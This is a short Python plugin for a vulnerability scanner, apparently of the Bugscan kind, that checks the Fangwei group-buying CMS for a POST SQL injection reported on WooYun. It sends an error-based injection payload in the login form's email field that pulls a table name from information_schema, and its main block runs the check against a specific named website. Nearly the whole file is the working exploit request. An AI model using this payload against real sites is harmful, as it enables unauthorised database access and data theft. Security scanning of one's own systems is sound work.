#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: 方维团购最新版通杀post注入
#Refer:http://www.wooyun.org/bugs/wooyun-2014-078865
#Author:xq17

def assign(service,arg):
    if service=="fangwei":
        return True,arg
    
def audit(arg):
        URL=arg+"m.php?m=User&a=doLogin"
        data="origURL=xq17&password=xq17&email=xq17'and(select 1 from(select count(*),concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),concat(0x7e,md5(1)),floor(rand(0)*2))x from information_schema.tables group by x)a)and'"
        code, head, res, errcode, _ = curl.curl2(URL,data)

        
        if  code== 200 and 'c4ca4238a0b923820dcc509a6f75849b1' in res:
            
                security_hole(URL+'     found sql injection please by post way')

if  __name__ == '__main__':
    from dummy import *
    audit(assign("fangwei","http://www.qianrengou.com/")[1])